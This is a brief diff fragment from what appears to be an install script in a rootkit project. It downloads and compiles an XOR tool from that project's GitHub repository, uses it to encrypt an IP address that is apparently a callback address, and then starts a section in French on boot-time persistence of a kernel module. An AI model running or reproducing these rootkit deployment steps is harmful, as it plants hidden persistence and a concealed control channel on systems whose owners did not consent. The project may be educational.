@@ -15,7 +15,7 @@ key=126
 
 wget https://github.com/gobelinor/Rootkit-Project/raw/refs/heads/dev_tibo/mesmodules/insert/xor.c
 gcc -o xor xor.c
-encrypted=$(echo $IP_ADDR | ./xor $key)
+encrypted=$(./xor $IP_ADDR)
 echo "ip chiffrée: $encrypted"
 
 # persistence (load le module au demarage)
